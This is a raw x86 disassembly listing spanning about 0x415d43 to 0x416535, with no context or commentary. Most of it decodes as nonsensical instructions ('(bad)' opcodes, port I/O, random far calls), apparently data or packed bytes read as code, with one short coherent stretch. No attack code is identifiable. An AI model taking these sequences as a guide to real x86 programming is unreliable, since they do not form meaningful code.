  415d43:	xlat   BYTE PTR ds:[ebx]
  415d44:	xor    BYTE PTR [ebx+0x6c],bl
  415d47:	cmp    ebp,DWORD PTR [ebx]
  415d49:	sar    BYTE PTR [esi-0x47],0xc6
  415d4d:	push   eax
  415d4e:	pop    edi
  415d4f:	sub    eax,0x36d3689f
  415d54:	pop    ebp
  415d55:	cmp    edi,DWORD PTR [edi+0x5e]
  415d58:	aad    0xa4
  415d5a:	inc    eax
  415d5b:	mov    gs,WORD PTR [ecx-0x71aa16e8]
  415d61:	mov    ah,0xf4
  415d63:	xchg   esp,eax
  415d64:	cmp    ebx,DWORD PTR [esi-0x4]
  415d67:	sahf   
  415d68:	inc    ecx
  415d69:	jb     0x415d00
  415d6b:	adc    ebx,0x3116dd9b
  415d71:	or     esi,eax
  415d73:	jns    0x415d92
  415d75:	lods   eax,DWORD PTR ds:[esi]
  415d76:	dec    eax
  415d77:	in     eax,0xaa
  415d79:	pop    ds
  415d7a:	xor    DWORD PTR [eax],edi
  415d7c:	or     DWORD PTR [ebx],esp
  415d7e:	xlat   BYTE PTR ds:[ebx]
  415d7f:	and    eax,0x6e7819fc
  415d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d85:	pop    esi
  415d86:	add    eax,0x74d1e12c
  415d8b:	test   DWORD PTR [ecx],edx
  415d8d:	adc    DWORD PTR [esi+0x9ff9dd],0xd7dceca1
  415d97:	lds    esi,FWORD PTR [eax]
  415d99:	stos   BYTE PTR es:[edi],al
  415d9a:	cmc    
  415d9b:	xor    BYTE PTR [edi-0x74],ah
  415d9e:	jmp    0xaa57b76
  415da3:	add    DWORD PTR [esi],edi
  415da5:	imul   ecx,DWORD PTR [esi],0xd9708f49
  415dab:	cmp    esp,ebx
  415dad:	sub    eax,0x915ea33b
  415db2:	cmp    BYTE PTR [ebx+0x6ef31f95],bh
  415db8:	cdq    
  415db9:	cmp    eax,0xd8f0d9c0
  415dbe:	push   0x84a65ded
  415dc3:	aas    
  415dc4:	sub    dh,BYTE PTR [ecx+0x28]
  415dc7:	sbb    DWORD PTR [edi],edx
  415dc9:	outs   dx,DWORD PTR ds:[esi]
  415dca:	ins    DWORD PTR es:[edi],dx
  415dcb:	push   ecx
  415dcc:	push   ecx
  415dcd:	loope  0x415e4c
  415dcf:	push   eax
  415dd0:	sbb    bl,BYTE PTR [edx-0xfd17c95]
  415dd6:	mov    WORD PTR [ecx-0x16f5a231],ss
  415ddc:	mov    al,0xb4
  415dde:	ja     0x415dfc
  415de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415de1:	xchg   ecx,eax
  415de2:	jnp    0x415e45
  415de4:	test   eax,0xcb1fdd20
  415de9:	loope  0x415d8e
  415deb:	in     al,0xef
  415ded:	(bad)  
  415dee:	fidivr DWORD PTR [edx+eiz*1]
  415df1:	sbb    eax,0xa2fb4ab6
  415df6:	call   0x54a9:0xceecca8f
  415dfd:	and    eax,0xc1c4c6e5
  415e02:	ss rcl edx,1
  415e05:	xor    ecx,DWORD PTR [edx+0x5a]
  415e08:	call   DWORD PTR [eax-0x48e355d3]
  415e0e:	lods   eax,DWORD PTR ds:[esi]
  415e0f:	ja     0x415e0f
  415e11:	sar    DWORD PTR ds:0xb071a325,1
  415e17:	mov    DWORD PTR [ebx+0xa4e87b0],eax
  415e1d:	push   es
  415e1e:	jmp    0x415e48
  415e20:	ss or  al,0xd0
  415e23:	jno    0x415e20
  415e25:	xchg   esi,eax
  415e26:	xchg   DWORD PTR [edx+0x2],eax
  415e29:	fdiv   QWORD PTR [eax-0x697e90df]
  415e2f:	mov    DWORD PTR [eax-0x47],eax
  415e32:	imul   edx,DWORD PTR [ebx],0x63b0a1d2
  415e38:	in     eax,dx
  415e39:	dec    esi
  415e3a:	dec    ebp
  415e3b:	stos   DWORD PTR es:[edi],eax
  415e3c:	xor    eax,0x981542ce
  415e41:	push   esp
  415e42:	call   0x8189:0x3b55231e
  415e49:	cmp    eax,0x58181399
  415e4e:	scas   eax,DWORD PTR es:[edi]
  415e4f:	cmp    DWORD PTR [ebx],0x7e9f5f0d
  415e55:	nop
  415e56:	cmp    al,BYTE PTR [esp+ecx*1+0x8]
  415e5a:	push   0x39
  415e5c:	in     eax,0xeb
  415e5e:	or     edi,DWORD PTR [edx+0x54642d3b]
  415e64:	pop    ds
  415e65:	and    dl,bh
  415e67:	pop    ecx
  415e68:	daa    
  415e69:	lds    eax,FWORD PTR [ebx-0x5d]
  415e6c:	push   0x66fb3ad6
  415e71:	or     al,0x4f
  415e73:	dec    ebx
  415e74:	das    
  415e75:	ret    0xcdbd
  415e78:	mov    esp,?
  415e7a:	arpl   sp,si
  415e7c:	mov    edx,0x63479932
  415e81:	mov    DWORD PTR [eax],ebx
  415e83:	push   edi
  415e84:	push   0xffffffc4
  415e86:	push   esi
  415e87:	sbb    eax,0x2b1e3ae5
  415e8c:	jp     0x415e7f
  415e8e:	jmp    0xaa14:0x1378322b
  415e95:	add    ecx,DWORD PTR [esi+ecx*8-0x36]
  415e99:	out    dx,al
  415e9a:	loop   0x415ea5
  415e9c:	pop    es
  415e9d:	xchg   esp,ebp
  415e9f:	and    edi,DWORD PTR [edi]
  415ea1:	mov    bl,0x3f
  415ea3:	or     ah,BYTE PTR [edx+0x218a032d]
  415ea9:	int3   
  415eaa:	jb     0x415e63
  415eac:	ficomp DWORD PTR [ebx]
  415eae:	cmp    ecx,DWORD PTR [edi+0x33d2a927]
  415eb4:	mov    edx,0x6b312ea7
  415eb9:	ror    ah,cl
  415ebb:	shr    DWORD PTR [ebp-0x44a75305],0x66
  415ec2:	add    esp,DWORD PTR [edx+ecx*2+0x4f933d71]
  415ec9:	jb     0x415eaa
  415ecb:	ret    
  415ecc:	les    edi,FWORD PTR [ebx+0x303c89bb]
  415ed2:	(bad)  
  415ed4:	lds    esp,FWORD PTR [eax-0x51]
  415ed7:	mov    ebp,0x3d052671
  415edc:	cdq    
  415edd:	jbe    0x415ef0
  415edf:	mov    dh,0xd1
  415ee1:	ret    0xe81c
  415ee4:	mov    dh,0x41
  415ee6:	xlat   BYTE PTR ds:[ebx]
  415ee7:	mov    dl,0x12
  415ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eea:	adc    DWORD PTR [eax-0x15],ebp
  415eed:	mov    esi,DWORD PTR [esi+0x70fcd98b]
  415ef3:	jle    0x415ee3
  415ef5:	rcr    bh,0xd0
  415ef8:	sti    
  415ef9:	jmp    0x415e85
  415efb:	inc    ebp
  415efc:	cdq    
  415efd:	aad    0x58
  415eff:	cmc    
  415f00:	dec    edi
  415f01:	daa    
  415f02:	push   es
  415f03:	mov    al,ds:0x4abb82d9
  415f08:	xchg   edi,eax
  415f09:	clc    
  415f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f0b:	sub    DWORD PTR [edi+eax*8],esi
  415f0e:	cmp    al,0x6b
  415f10:	js     0x415ec3
  415f12:	mov    al,ds:0x308add41
  415f17:	imul   ecx,DWORD PTR [ebp+0x7e38d43a],0x916a8581
  415f21:	xor    ebx,ebp
  415f23:	daa    
  415f24:	retf   0x7c5
  415f27:	push   edx
  415f28:	xor    bl,bh
  415f2a:	rcr    DWORD PTR [eax-0x358a68aa],0xa6
  415f31:	fwait
  415f32:	in     al,dx
  415f33:	fbstp  TBYTE PTR [ebp-0x47121d5]
  415f39:	pushf  
  415f3a:	mov    ebx,0x9a083e6a
  415f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f40:	sbb    eax,0x3e518cf
  415f45:	adc    eax,0xdc161720
  415f4a:	cmp    DWORD PTR [edi+0x70],eax
  415f4d:	push   ecx
  415f4e:	mov    ebp,0xa6138541
  415f53:	ins    BYTE PTR es:[edi],dx
  415f54:	imul   esi,DWORD PTR [ebp+0x7c],0x301e3657
  415f5b:	cld    
  415f5c:	cmp    edi,DWORD PTR [ebp+0x152c8692]
  415f62:	popf   
  415f63:	fs jnp 0x415fae
  415f66:	(bad)  
  415f67:	out    dx,eax
  415f68:	cmp    BYTE PTR [edi-0x56da65a5],bh
  415f6e:	fwait
  415f6f:	mov    ecx,0x36b1fb91
  415f74:	mov    dl,0x63
  415f76:	pop    eax
  415f77:	and    eax,0x1b31d9d9
  415f7c:	or     ch,BYTE PTR [edx-0x2944857e]
  415f82:	test   al,0x41
  415f84:	or     ebx,0x4390a196
  415f8a:	mov    eax,0x84852748
  415f8f:	mov    dh,0x43
  415f91:	outs   dx,BYTE PTR ds:[esi]
  415f92:	scas   al,BYTE PTR es:[edi]
  415f93:	das    
  415f94:	repnz loope 0x415f65
  415f97:	aam    0x92
  415f99:	lds    edx,FWORD PTR ds:0x8111562d
  415f9f:	ins    BYTE PTR es:[edi],dx
  415fa0:	jmp    0x415f97
  415fa2:	xor    eax,0x1e75048d
  415fa7:	cli    
  415fa8:	adc    bl,BYTE PTR [ebx+edi*2+0x3908133e]
  415faf:	fisub  WORD PTR ds:0xeeb25ce1
  415fb5:	lods   al,BYTE PTR ds:[esi]
  415fb6:	xlat   BYTE PTR ds:[ebx]
  415fb7:	jp     0x415f52
  415fb9:	dec    ebp
  415fba:	push   esp
  415fbb:	aam    0x34
  415fbd:	cmp    al,0xa
  415fbf:	data16 adc dh,BYTE PTR [esi-0x514e8f9b]
  415fc6:	xor    ebp,edx
  415fc8:	xchg   edx,eax
  415fc9:	pop    esp
  415fca:	mov    ah,0xe7
  415fcc:	sub    bl,BYTE PTR [ebx]
  415fce:	sub    esp,esi
  415fd0:	pop    ds
  415fd1:	iret   
  415fd2:	jecxz  0x415f69
  415fd4:	aas    
  415fd5:	cmp    edi,DWORD PTR [eax+0x1fa3b159]
  415fdb:	jl     0x41601a
  415fdd:	jl     0x415ffc
  415fdf:	jecxz  0x416020
  415fe1:	mov    edi,0x5c7ce3e6
  415fe6:	or     cl,BYTE PTR [edx-0x7d]
  415fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fea:	mov    al,0x28
  415fec:	sbb    BYTE PTR [ecx],ah
  415fee:	or     ecx,DWORD PTR [ebx-0x3b]
  415ff1:	mov    ch,BYTE PTR [esi-0x6]
  415ff4:	imul   ebp,eax,0x30222802
  415ffa:	add    esp,DWORD PTR [ecx+0x24]
  415ffd:	ficom  WORD PTR [ebx-0x1f1eb2a4]
  416003:	push   0x21
  416005:	xor    edx,ebx
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0x70d2f093
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	icebp  
  41605c:	mov    bh,0x85
  41605e:	cmp    DWORD PTR [ebx],0x1bcc1ad7
  416064:	and    eax,0xdd3b7021
  416069:	adc    BYTE PTR [ebx],al
  41606b:	sti    
  41606c:	enter  0xfaa1,0xa3
  416070:	sub    ecx,DWORD PTR [edx-0xe]
  416073:	xchg   esi,eax
  416074:	jle    0x416033
  416076:	test   BYTE PTR [ebp-0x7e40aa16],bh
  41607c:	pop    eax
  41607d:	ficom  DWORD PTR [edi]
  41607f:	and    ch,ah
  416081:	add    al,BYTE PTR [ebx-0x81a8fe3]
  416087:	mov    ds:0x8edaf18f,eax
  41608c:	mov    al,0x26
  41608e:	loop   0x4160d8
  416090:	sti    
  416091:	inc    ebx
  416092:	sar    ebp,1
  416094:	rcr    edi,0xa6
  416097:	push   eax
  416098:	fild   QWORD PTR [edx-0x71f589d0]
  41609e:	ret    
  41609f:	lods   al,BYTE PTR ds:[esi]
  4160a0:	test   BYTE PTR [ebx+0x7a7bd28d],bh
  4160a6:	ins    DWORD PTR es:[edi],dx
  4160a7:	arpl   WORD PTR [ebp+0x43955c9e],di
  4160ad:	fcom   DWORD PTR [ecx+0x48]
  4160b0:	mov    ebp,0x60ddc66b
  4160b5:	loop   0x416055
  4160b7:	outs   dx,BYTE PTR ds:[esi]
  4160b8:	call   0xfd82:0x9254604f
  4160bf:	(bad)  
  4160c0:	out    0x6b,al
  4160c2:	fimul  DWORD PTR [ebp+0x79]
  4160c5:	adc    eax,0x3667feae
  4160ca:	ins    BYTE PTR es:[edi],dx
  4160cb:	nop
  4160cc:	je     0x4160fa
  4160ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160cf:	push   es
  4160d0:	fcomp  st(5)
  4160d2:	mov    ecx,DWORD PTR [edi-0x30fe0262]
  4160d8:	xchg   DWORD PTR [ecx+ebp*4],edi
  4160db:	jge    0x4160cc
  4160dd:	icebp  
  4160de:	js     0x4160f3
  4160e0:	mov    bl,0x28
  4160e2:	pushf  
  4160e3:	sub    DWORD PTR [ecx-0x3dcd424e],esi
  4160e9:	shl    BYTE PTR [ebx-0x43],cl
  4160ec:	mov    ds:0x27eab0b5,eax
  4160f1:	aas    
  4160f2:	cmp    al,0x85
  4160f4:	in     eax,0x8a
  4160f6:	jle    0x4160de
  4160f8:	ror    DWORD PTR [ecx-0x6b6dbfe1],cl
  4160fe:	inc    ebp
  4160ff:	out    dx,al
  416100:	mov    edi,0x2d77ac74
  416105:	retf   
  416106:	inc    edx
  416107:	adc    ecx,edi
  416109:	cli    
  41610a:	cmp    BYTE PTR [ecx-0x30],bh
  41610d:	mov    dl,0xfc
  41610f:	jb     0x41615b
  416111:	xor    al,0x4
  416113:	cs daa 
  416115:	mov    bl,0x8d
  416118:	sub    BYTE PTR [esi],0xda
  41611b:	call   0x54c2:0x51b82ea4
  416122:	or     BYTE PTR [ebx-0x6316f0d4],dh
  416128:	dec    eax
  416129:	jno    0x416141
  41612b:	fwait
  41612c:	sar    ecx,0x4f
  41612f:	das    
  416130:	xchg   esp,eax
  416131:	xchg   ebx,eax
  416132:	lds    eax,FWORD PTR [eax]
  416134:	pop    ebx
  416135:	aas    
  416136:	mov    bh,0xef
  416138:	loopne 0x4160ea
  41613a:	xchg   esi,eax
  41613b:	loopne 0x4160cf
  41613d:	xor    BYTE PTR [ebx],al
  41613f:	dec    ecx
  416140:	outs   dx,BYTE PTR ds:[esi]
  416141:	mov    al,0x1f
  416143:	in     eax,0x96
  416145:	bound  eax,QWORD PTR [eax+0x11]
  416148:	xchg   BYTE PTR [bp+si-0x41dd],dh
  41614d:	jge    0x4160df
  41614f:	cmp    ch,BYTE PTR [edi+0x220f3e3b]
  416155:	js     0x41614e
  416157:	aas    
  416158:	inc    ebp
  416159:	sub    BYTE PTR ds:0x43d2ee4,bl
  41615f:	fst    st(5)
  416161:	pop    ds
  416162:	fstp   DWORD PTR [edi-0x2d]
  416165:	jae    0x4161ba
  416167:	rcl    BYTE PTR [bx+di-0x2571],cl
  41616c:	mov    ebx,edi
  41616e:	push   edi
  41616f:	pop    eax
  416170:	je     0x41618f
  416172:	in     eax,0xd3
  416174:	ss ins DWORD PTR es:[edi],dx
  416176:	sbb    DWORD PTR [ebx],ecx
  416178:	icebp  
  416179:	(bad)  
  41617a:	iret   
  41617b:	call   0xf421:0x1e1550eb
  416182:	push   0xffffffe6
  416184:	xchg   DWORD PTR [eax+0x2b5bbf65],edx
  41618a:	popa   
  41618b:	pop    ss
  41618c:	(bad)  
  41618d:	sub    DWORD PTR [ebp+0x78ab9bed],ebp
  416193:	call   0xbc7f:0x22b1ab46
  41619a:	aam    0x11
  41619c:	out    dx,al
  41619d:	call   0xdd63:0xd162630a
  4161a4:	cmp    al,0x9a
  4161a6:	out    0x15,eax
  4161a8:	ret    
  4161a9:	push   esp
  4161aa:	aas    
  4161ab:	mov    bh,0x1e
  4161ad:	es add dh,bl
  4161b0:	dec    ebp
  4161b1:	test   BYTE PTR [ebx],dh
  4161b3:	dec    edi
  4161b4:	iret   
  4161b5:	mov    edx,0x403c5e02
  4161ba:	dec    esi
  4161bb:	inc    edi
  4161bc:	in     al,dx
  4161bd:	pop    eax
  4161be:	out    dx,al
  4161bf:	xchg   DWORD PTR [ecx-0x3e528ff5],ebx
  4161c5:	mov    ebp,0x1222a8e2
  4161ca:	retf   
  4161cb:	or     DWORD PTR [ecx],ecx
  4161cd:	in     al,dx
  4161ce:	(bad)  gs:[ecx]
  4161d1:	or     BYTE PTR [esi+0x21],ah
  4161d4:	cli    
  4161d5:	mov    ebp,0x4ca990a4
  4161da:	ja     0x41620d
  4161dc:	pop    DWORD PTR [eax-0x7da2a7d4]
  4161e2:	sub    DWORD PTR [eax+0x73f2af0b],ecx
  4161e8:	mov    dl,0xe2
  4161ea:	mov    ecx,0x741a1078
  4161ef:	lods   eax,DWORD PTR ds:[esi]
  4161f0:	mov    eax,0x110540b4
  4161f5:	jo     0x4161ef
  4161f7:	std    
  4161f8:	fild   WORD PTR [eax+edi*8+0x4b]
  4161fc:	pop    es
  4161fd:	mov    bl,0x4a
  4161ff:	pop    ebp
  416200:	jnp    0x4161da
  416202:	xor    eax,0xbdccf992
  416207:	lds    ebx,FWORD PTR [edi]
  416209:	xchg   bl,ch
  41620b:	(bad)  [eax+0x3ab22b79]
  416211:	mov    edi,0xf9e82703
  416216:	pop    ds
  416217:	cdq    
  416218:	sbb    eax,0x3c8ebf3e
  41621d:	in     al,0x19
  41621f:	ds jae 0x416243
  416222:	pop    eax
  416223:	push   0xffffffaf
  416225:	or     eax,0x7128e03f
  41622a:	mov    ds,ecx
  41622c:	or     eax,0x78b0e151
  416231:	lods   al,BYTE PTR ds:[esi]
  416232:	cld    
  416233:	out    dx,al
  416234:	pop    esp
  416235:	int3   
  416236:	rcl    cl,1
  416238:	loop   0x416272
  41623a:	xor    ebx,DWORD PTR [eax-0x4e1d1071]
  416240:	in     al,0x53
  416242:	inc    DWORD PTR [ebp-0x5bba5f72]
  416248:	dec    ecx
  416249:	push   es
  41624a:	loopne 0x416233
  41624c:	int    0xb5
  41624e:	test   eax,0x81951df6
  416253:	and    DWORD PTR [ebx+0x756bacf0],esp
  416259:	add    al,0x2d
  41625b:	cmp    eax,0x84da9607
  416260:	cld    
  416261:	mov    cl,0x3b
  416263:	imul   DWORD PTR cs:[edi]
  416266:	pop    esi
  416267:	imul   ecx,DWORD PTR [esi+0x66],0xa0d089a7
  41626e:	icebp  
  41626f:	std    
  416270:	aas    
  416271:	ins    DWORD PTR es:[edi],dx
  416272:	in     al,0x85
  416274:	leave  
  416275:	repz mov eax,DWORD PTR [ecx]
  416278:	dec    ebx
  416279:	int    0x8a
  41627b:	or     bh,ch
  41627d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41627e:	gs add eax,0x6e86f725
  416284:	popf   
  416285:	mov    esi,0xa054261f
  41628a:	call   0x74f8:0xe6b1cd41
  416291:	inc    esi
  416292:	fdiv   DWORD PTR [ebx+eiz*2+0x7f]
  416296:	ficom  WORD PTR [ebx+0x481be93a]
  41629c:	pop    esp
  41629d:	push   ss
  41629e:	pop    edi
  41629f:	test   BYTE PTR ds:0xd9b2af4a,ch
  4162a5:	shr    ecx,cl
  4162a7:	xchg   ebx,eax
  4162a8:	lods   eax,DWORD PTR ds:[esi]
  4162a9:	cmp    DWORD PTR [esi*8+0x6aa9f7e1],edx
  4162b0:	nop
  4162b1:	xchg   esp,eax
  4162b2:	ins    BYTE PTR es:[edi],dx
  4162b3:	jne    0x41630c
  4162b5:	lods   eax,DWORD PTR gs:[esi]
  4162b7:	dec    ecx
  4162b8:	xchg   edi,eax
  4162b9:	mov    cl,BYTE PTR [ecx-0x37b63a59]
  4162bf:	inc    eax
  4162c0:	arpl   WORD PTR [ebp+0x30],ax
  4162c3:	repnz in al,0xad
  4162c6:	ins    DWORD PTR es:[edi],dx
  4162c7:	sub    DWORD PTR [esi+0x4ebff650],0x1fe49d61
  4162d1:	xchg   esp,eax
  4162d2:	in     eax,0xd8
  4162d4:	js     0x416294
  4162d6:	retf   0xa96e
  4162d9:	jo     0x41627c
  4162db:	div    BYTE PTR [esi+eax*8]
  4162de:	fdivr  DWORD PTR [edi+ebp*4]
  4162e1:	lds    eax,FWORD PTR [esi+0x5e30c107]
  4162e7:	mov    bl,0x1
  4162e9:	mov    DWORD PTR [ebp-0x6d3a39ed],0x891c9818
  4162f3:	test   eax,0x2780740c
  4162f8:	lods   al,BYTE PTR ds:[esi]
  4162f9:	out    dx,eax
  4162fa:	xchg   edi,eax
  4162fb:	xor    eax,0xdcd7bb65
  416300:	jno    0x41632c
  416302:	push   edi
  416303:	ror    cl,cl
  416305:	test   esi,edi
  416307:	sbb    BYTE PTR [edi+0x30fa487e],0x62
  41630e:	cmp    edx,DWORD PTR [edi-0x75]
  416311:	sti    
  416312:	loope  0x416358
  416314:	jo     0x4162ed
  416316:	iret   
  416317:	xor    al,0xbf
  416319:	push   ss
  41631a:	icebp  
  41631b:	push   edx
  41631c:	jle    0x41635a
  41631e:	idiv   DWORD PTR [ebp+eiz*8-0x678c17e9]
  416325:	ret    
  416326:	aad    0x7d
  416328:	xchg   BYTE PTR [ebp-0x23afeab9],dh
  41632e:	fsubr  st(1),st
  416330:	jo     0x416368
  416332:	sub    BYTE PTR [eax],bh
  416334:	retf   0x286e
  416337:	test   DWORD PTR ds:[esi+eiz*8+0x550a8b9d],ebp
  41633f:	imul   esp,DWORD PTR [ecx+0x44],0x7fbe622f
  416346:	xchg   ebp,eax
  416347:	ss and eax,0x87c65768
  41634d:	sar    DWORD PTR [ecx-0x539e3779],cl
  416353:	xor    al,0xd8
  416355:	add    eax,0x597700bb
  41635a:	inc    edi
  41635b:	push   ebx
  41635c:	mov    edi,0xf99cda27
  416361:	jecxz  0x4163b5
  416363:	stos   DWORD PTR es:[edi],eax
  416364:	in     al,dx
  416365:	mov    ah,0xe2
  416367:	pusha  
  416368:	mov    ?,WORD PTR [edi]
  41636a:	mov    esi,0xdf5acd9a
  41636f:	xor    ch,ch
  416371:	cwde   
  416372:	call   0x5a7cb132
  416377:	jno    0x416345
  416379:	ret    0x96e7
  41637c:	dec    ecx
  41637d:	mov    cl,BYTE PTR [ebx]
  41637f:	adc    DWORD PTR [esi],ebp
  416381:	xor    bl,dl
  416383:	push   ss
  416384:	mov    BYTE PTR [eax],bh
  416386:	mov    ebp,0xa969bd92
  41638b:	sbb    dh,ch
  41638d:	fiadd  WORD PTR [edi-0x74]
  416390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416391:	pop    edx
  416392:	mov    DWORD PTR [esp+edx*4-0x3f481190],edi
  416399:	lods   al,BYTE PTR ds:[esi]
  41639a:	cmp    edx,DWORD PTR [esi]
  41639c:	jns    0x41632c
  41639e:	cs pushf 
  4163a0:	sub    dh,bh
  4163a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163a3:	arpl   WORD PTR es:[edx-0x23],si
  4163a7:	cmp    BYTE PTR [ecx+0x29],dl
  4163aa:	stos   DWORD PTR es:[edi],eax
  4163ab:	xchg   DWORD PTR [ecx+0x25],esi
  4163ae:	push   ds
  4163af:	retf   
  4163b0:	es (bad) 
  4163b2:	fidivr WORD PTR [esi-0x73239994]
  4163b8:	xchg   BYTE PTR [edx+0x13],bl
  4163bb:	js     0x4163ef
  4163bd:	inc    ebp
  4163be:	jmp    0x41643d
  4163c0:	xor    eax,0x1a1aae45
  4163c5:	iret   
  4163c6:	test   BYTE PTR ds:0x7d189861,cl
  4163cc:	lods   al,BYTE PTR ds:[esi]
  4163cd:	(bad)  
  4163ce:	cdq    
  4163cf:	sub    al,0x80
  4163d1:	data16 cmp bh,ch
  4163d4:	mov    ds:0x54d33a11,eax
  4163d9:	fld    DWORD PTR es:[eax+0x5b]
  4163dd:	inc    eax
  4163de:	jle    0x4163ef
  4163e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163e1:	sub    DWORD PTR [edx-0x1d],esp
  4163e4:	push   0x25
  4163e6:	imul   ebp,ebx,0xffffff91
  4163e9:	into   
  4163ea:	sbb    eax,0xe93f72ce
  4163ef:	call   0x868ae84b
  4163f4:	hlt    
  4163f5:	add    BYTE PTR [esi-0x2eed6cbf],ah
  4163fb:	sbb    eax,eax
  4163fd:	xor    edx,DWORD PTR [bp+si]
  416400:	sbb    al,0x9f
  416402:	out    0x1d,al
  416404:	jmp    0x416423
  416406:	dec    esi
  416407:	popf   
  416408:	adc    eax,0x42434aed
  41640d:	pop    esi
  41640e:	in     eax,dx
  41640f:	jmp    0x416411
  416411:	sub    al,0xdc
  416413:	stc    
  416414:	push   cs
  416415:	ins    BYTE PTR es:[edi],dx
  416416:	call   0xfff9b2c0
  41641b:	adc    al,0xe0
  41641d:	fcomp  st(3)
  41641f:	and    bh,dl
  416421:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  416423:	in     eax,dx
  416424:	int3   
  416425:	jg     0x41644c
  416427:	xchg   DWORD PTR [esi],ebp
  416429:	arpl   WORD PTR [eax],cx
  41642b:	mov    ds:0x36c9b9ab,eax
  416430:	lods   eax,DWORD PTR ds:[esi]
  416431:	loop   0x41644b
  416433:	fstp   TBYTE PTR [edi+ebp*1+0x1a]
  416437:	mov    edi,DWORD PTR [ecx-0x5f7440b]
  41643d:	data16 or al,0x59
  416440:	mov    esi,0xde66295a
  416445:	call   0x672d:0x6dac7200
  41644c:	test   BYTE PTR [edi],0x40
  41644f:	or     al,0xac
  416451:	pop    ecx
  416452:	jno    0x41644b
  416454:	gs aam 0x16
  416457:	push   0xe6982eef
  41645c:	jae    0x4164c5
  41645e:	sbb    edx,DWORD PTR [ebp+0x42fd2353]
  416464:	mov    bl,0x3c
  416466:	cmp    eax,0x6b7f708c
  41646b:	mov    DWORD PTR [edx+0x32],0x9b30b12e
  416472:	sbb    ebx,DWORD PTR [ebx]
  416474:	mov    bl,0xcd
  416476:	loopne 0x41646f
  416478:	dec    ebx
  416479:	es dec edi
  41647b:	jmp    0x416455
  41647d:	mov    dl,0xff
  41647f:	aas    
  416480:	push   ebp
  416481:	mov    ch,0xc1
  416483:	mov    ds:0x432e2a1d,al
  416488:	out    0x8b,eax
  41648a:	inc    ecx
  41648b:	(bad)  
  41648c:	or     eax,0x9fa25c55
  416491:	sbb    bh,BYTE PTR [edi-0x7f]
  416494:	mov    ds,WORD PTR [eax+edi*4+0x60]
  416498:	jnp    0x4164dc
  41649a:	xor    eax,0xdb2342fb
  41649f:	jno    0x41647c
  4164a1:	arpl   WORD PTR [edx],di
  4164a3:	mov    BYTE PTR [eax+0x14],bh
  4164a6:	pop    ss
  4164a7:	rcr    ebx,cl
  4164a9:	cs add al,0x8b
  4164ac:	pop    esi
  4164ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164ae:	mov    cr5,edi
  4164b1:	adc    esp,edx
  4164b3:	dec    edi
  4164b4:	mov    ds:0x3a9a3cf8,al
  4164b9:	aam    0x1e
  4164bb:	fcom   DWORD PTR [edx-0x75]
  4164be:	sub    DWORD PTR [ebx-0x5b],esi
  4164c1:	push   0xbf9ae7a9
  4164c6:	pop    edx
  4164c7:	xchg   DWORD PTR [eax+0x55],edx
  4164ca:	bound  ebp,QWORD PTR gs:[ecx]
  4164cd:	jge    0x41646a
  4164cf:	pop    ss
  4164d0:	push   ds
  4164d1:	mov    al,0x6c
  4164d3:	(bad)  
  4164d4:	and    eax,0xb4292e68
  4164d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164da:	fs aas 
  4164dc:	bound  ecx,QWORD PTR [ecx+0x996306]
  4164e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e3:	adc    DWORD PTR [edi],esp
  4164e5:	test   al,cl
  4164e7:	fdiv   QWORD PTR [esi-0x344850a]
  4164ed:	inc    edx
  4164ee:	dec    ebx
  4164ef:	dec    edx
  4164f0:	ret    0xf664
  4164f3:	and    eax,0xacb6899d
  4164f8:	add    BYTE PTR [ecx+0x2a75709d],dl
  4164fe:	sahf   
  4164ff:	push   ss
  416500:	cmp    ebx,DWORD PTR [esi]
  416502:	xchg   edi,eax
  416503:	xchg   esi,eax
  416504:	sub    ecx,DWORD PTR [eax]
  416506:	arpl   bp,di
  416508:	stc    
  416509:	sbb    DWORD PTR [eax-0x2d],ebp
  41650c:	mov    dh,0x2a
  41650e:	mov    edi,DWORD PTR [edi-0x5d]
  416511:	sbb    eax,DWORD PTR [ebx]
  416513:	pop    ebx
  416514:	xchg   DWORD PTR [eax],edi
  416516:	nop
  416517:	xor    al,0xf7
  416519:	gs mov dl,0x50
  41651c:	jmp    DWORD PTR [ecx]
  41651e:	inc    ebp
  41651f:	test   eax,0x3660eb5c
  416524:	sbb    BYTE PTR [ebx],dh
  416526:	jne    0x41651e
  416528:	and    DWORD PTR [ebx+0x10454724],edx
  41652e:	jmp    DWORD PTR [ecx]
  416530:	or     DWORD PTR [ecx],edx
  416532:	fs push cs
  416534:	cwde   
  416535:	xor    DWORD PTR [edi],edx
